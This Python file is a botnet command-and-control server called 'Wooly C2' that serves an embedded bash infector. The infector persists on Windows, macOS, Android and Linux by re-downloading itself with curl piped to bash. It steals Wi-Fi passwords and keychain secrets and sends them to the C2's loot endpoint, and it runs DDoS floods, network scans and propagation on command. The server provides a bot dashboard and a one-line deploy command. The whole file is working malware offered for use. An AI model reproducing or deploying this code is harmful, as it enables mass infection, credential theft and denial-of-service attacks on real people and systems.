#!/usr/bin/env python3
# Wooly VPS C2 v10.4 - FIXED FOR PYTHON 3.13
import os, ssl, socket, json, subprocess, threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from html import escape

# ==================== EMBEDDED INFECTOR ====================
INFECT_SH = '''#!/bin/bash
# Wooly Omni-Infector v10.2
readonly VPS_C2="$(curl -s ipinfo.io/ip 2>/dev/null || echo 127.0.0.1)"
readonly C2_PORT=443
readonly BOT_ID=$(printf '%s-%s-%s' "$(uname -s 2>/dev/null||echo unknown)" "$(hostname 2>/dev/null||echo unknown)" "$(whoami 2>/dev/null||echo root)" | sha256sum 2>/dev/null|cut -c1-16|tr -d '\\n')
readonly PAYLOAD_DIR="/dev/shm/.wpa_$$"

detect_platform() {
    command -v powershell >/dev/null 2>&1 && echo "windows" && return
    command -v getprop >/dev/null 2>&1 && echo "android" && return
    [[ "$OSTYPE" =~ darwin ]] && echo "macos" && return
    [[ -f /proc/version ]] && echo "linux" && return
    echo "iot"
}

persist_silent() {
    local plat=$(detect_platform)
    case $plat in
        windows) powershell -c "schtasks /create /tn 'NetworkService' /tr \"powershell -ep bypass -c \\\"curl https://$VPS_C2:$C2_PORT/infect.sh|iex\\\" \" /sc onstart /ru system /f" >/dev/null 2>&1 ;;
        macos) echo "@reboot curl -fsSL https://$VPS_C2:$C2_PORT/infect.sh|bash" >> ~/.bash_profile 2>/dev/null ;;
        android) echo "* * * * * curl -fsSL https://$VPS_C2:$C2_PORT/infect.sh|bash >/dev/null 2>&1" >> /data/local/tmp/cron 2>/dev/null ;;
        linux|iot) (crontab -l 2>/dev/null; echo "@reboot curl -fsSL https://$VPS_C2:$C2_PORT/infect.sh|bash >/dev/null 2>&1") | crontab - ;;
    esac >/dev/null 2>&1
}

steal_loot() {
    local plat=$(detect_platform); local loot=""
    case $plat in
        linux) loot=$(nmcli -t -f NAME,UUID dev wifi 2>/dev/null; grep psk= /etc/NetworkManager/system-connections/* 2>/dev/null | cut -d= -f2) ;;
        macos) loot=$(security find-generic-password -ga "*" 2>/dev/null 2>&1 | grep "password:" | cut -d'"' -f4) ;;
        android|iot) loot=$(grep psk= /data/misc/wifi/wpa_supplicant.conf 2>/dev/null 2>&1 | cut -d= -f2) ;;
    esac
    [[ -n "$loot" ]] && curl -s -d "{\"bot\":\"$BOT_ID\",\"data\":\"$loot\"}" "https://$VPS_C2:$C2_PORT/loot" --insecure >/dev/null 2>&1
}

c2_silent() {
    local cmd=$(echo -e "GET /cmd?bot=$BOT_ID HTTP/1.1\\r\\nHost: $VPS_C2:$C2_PORT\\r\\nConnection: close\\r\\n\\r\\n" | 
                timeout 10 nc -w3 "$VPS_C2" "$C2_PORT" 2>/dev/null | sed '1,/^$/d' | tr -d '\\r\\n ' | head -c 100)
    case $cmd in
        "ddos:"*) local target="${cmd#ddos:}"; timeout "${cmd#*:}" bash -c "while true; do echo -e 'GET / HTTP/1.1\\r\\nHost: $target\\r\\n\\r\\n' | nc $target 80; done" >/dev/null 2>&1 & ;;
        "steal") steal_loot ;;
        "scan") arp -a >/dev/null 2>&1 ;;
        "propagate") arp -a 2>/dev/null | awk '{print $2}' | tr -d '()' | grep -E '^[0-9]' | xargs -I {} -P5 timeout 3 nc -w2 {} 22 8080 >/dev/null 2>&1 & ;;
    esac
}

main_silent() {
    mkdir -p "$PAYLOAD_DIR" 2>/dev/null
    persist_silent
    echo -e "POST /checkin HTTP/1.1\\r\\nHost: $VPS_C2:$C2_PORT\\r\\nContent-Length: 64\\r\\n\\r\\nbot_id=$BOT_ID&os=$(detect_platform)&ip=$(curl -s ipinfo.io/ip||echo local)" |
    nc -w10 "$VPS_C2" "$C2_PORT" >/dev/null 2>&1
    while true; do c2_silent; steal_loot; sleep $((RANDOM%180+120)); done >/dev/null 2>&1
}
main_silent'''

# ==================== C2 SERVER (FIXED) ====================
bots = {}
commands = {}
loot_db = {}

class C2Server(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)
        
        if '/checkin' in self.path:
            bot_id = query_params.get('bot_id', ['unknown'])[0]
            os_type = query_params.get('os', ['unknown'])[0]
            ip = query_params.get('ip', ['local'])[0]
            
            bots[bot_id] = {'os': os_type, 'ip': ip, 'last_seen': str(datetime.now())}
            print(f"✅ [{len(bots)}] {bot_id} ({os_type}) → {ip}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"OK:{commands.pop(bot_id, '')}".encode())
            
        elif '/cmd' in self.path:
            bot_id = query_params.get('bot', [''])[0]
            self.send_response(200)
            self.end_headers()
            self.wfile.write(commands.pop(bot_id, b'ping').encode())
            
        elif '/bots' in self.path:
            hostname = socket.gethostbyname(socket.gethostname())
            port = '443' if os.geteuid() == 0 else '8443'
            html = f'''<!DOCTYPE html><html><head><title>🤖 Wooly C2 v10.4 ({len(bots)} bots)</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{{font-family:monospace;background:#000;color:lime;padding:20px}}input,select,button{{background:#111;color:lime;border:1px solid lime;padding:12px;width:100%;margin:5px 0;box-sizing:border-box}}pre{{background:#111;padding:15px;max-height:40vh;overflow:auto}}</style></head>
<body><h1>🤖 <b style="color:lime">{len(bots)}</b> Bots Online</h1>
<pre>{escape(json.dumps(bots, indent=2))}</pre>
<h2>📡 Send Commands:</h2><form method=POST action=/cmd>
<input name="bot_id" value="ALL" placeholder="Bot ID or ALL"><br>
<select name="cmd"><option value="ping">Ping</option><option value="steal">💰 Steal WiFi</option><option value="ddos:scanme.nmap.org:60">🌩️ DDoS Test</option><option value="scan">🔍 Scan</option><option value="propagate">📡 Spread</option></select><br><button>🚀 EXECUTE</button></form>
<h2>💎 Loot:</h2><pre>{escape(json.dumps(loot_db, indent=2))}</pre>
<h3>📥 Deploy: <code>curl -k https://{hostname}:{port}/infect.sh | bash</code></h3>
<script>setInterval(()=>fetch("/bots").then(r=>r.text()).then(d=>{{document.querySelector("pre").innerText=d.match(/{{.*}}/)[0]||""}}),3000)</script></body></html>'''
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
        elif '/infect.sh' in self.path:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(INFECT_SH.encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        parsed_post = parse_qs(post_data)
        
        if '/cmd' in self.path:
            bot_id = parsed_post.get('bot_id', ['ALL'])[0].upper()
            cmd = parsed_post.get('cmd', [''])[0]
            if bot_id == 'ALL' and bots:
                for bid in list(bots.keys()):
                    commands[bid] = cmd
            else:
                commands[bot_id] = cmd
            print(f"📡 '{cmd}' → {bot_id} ({len(bots) if bot_id=='ALL' else '1'})")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        elif '/loot' in self.path:
            try:
                data = json.loads(post_data)
                loot_db[data['bot']] = data['data'][:200]
            except:
                pass
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
    
    def log_message(self, *args): pass

def gen_ssl():
    if not all(os.path.exists(x) for x in ['server.crt','server.key']):
        subprocess.run(['openssl','req','-x509','-nodes','-days','365','-newkey','rsa:2048','-keyout','server.key','-out','server.crt','-subj','/CN=*','-quiet'], capture_output=True)
        print("🔒 SSL generated")

if __name__ == '__main__':
    gen_ssl()
    port = 443 if os.geteuid() == 0 else 8443
    httpd = HTTPServer(('0.0.0.0', port), C2Server)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('server.crt', 'server.key')
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    
    hostname = socket.gethostbyname(socket.gethostname())
    print(f"🚀 C2 v10.4 → https://0.0.0.0:{port}")
    print(f"📱 Dashboard: https://{hostname}:{port}/bots")
    print(f"📥 Payload: curl -k https://{hostname}:{port}/infect.sh | bash")
    httpd.serve_forever()
